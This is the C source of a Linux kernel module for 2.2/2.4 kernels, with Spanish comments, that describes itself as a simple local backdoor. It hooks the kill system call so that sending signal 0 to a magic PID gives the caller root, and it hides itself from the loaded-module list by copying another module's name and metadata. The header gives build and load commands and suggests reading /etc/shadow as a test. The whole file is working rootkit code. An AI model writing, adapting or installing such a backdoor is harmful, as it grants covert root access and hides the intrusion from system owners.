/*	
*  		gcc -Wall -O3 -c - I /usr/src/linux/include modulo.c
*	Ejecución:
*		./insmod modulo.o 
*	Test:
*		$id, $cat /etc/shadow ,etc.
*	Uso:
*		$ kill -0 COOLPID ( Ej.: kill -0 00000 )
*/
#define __KERNEL__
#define MODULE
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/module.h>
#include <asm/unistd.h>
#include <linux/sched.h>
#define COOLPID 00000
/* no queremos exportar los simbolos ;) */
EXPORT_NO_SYMBOLS;
extern void *sys_call_table[];
int (*killsysc)(pid_t pid,int sig);
/* nos da root si kill -0 COOLPID*/
int hook(pid_t pid,int sig){
if (sig==0 && pid== COOLPID) {
        current->euid=0;
        current->uid=0;
        }
return 0;
}
/* carga */
int init_module()
{       /* ocultamos el LKM */
        struct module *yo = &__this_module,
                      *secuestrado = NULL;
        secuestrado = yo->next;
	/* no pudo ser */
        if (!secuestrado) return -1;
	/* su DNI por favor ? */
        yo->name = secuestrado->name;
        yo->flags = secuestrado->flags;
        yo->size = secuestrado->size;
        yo->next = secuestrado->next;
	/* hookeamos */
        killsysc=sys_call_table[__NR_kill];
        sys_call_table[__NR_kill]=hook;
        return 0;
}
/* descarga ? */
int cleanup_module()
{
/* dejamos las cosas en orden */
sys_call_table[__NR_kill]=killsysc;
return 0;
}
/* :) */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("https://github.com/jmporcelg/lkm-examples");
MODULE_DESCRIPTION("backd00r local simple para 2.2.x y 2.4.x");
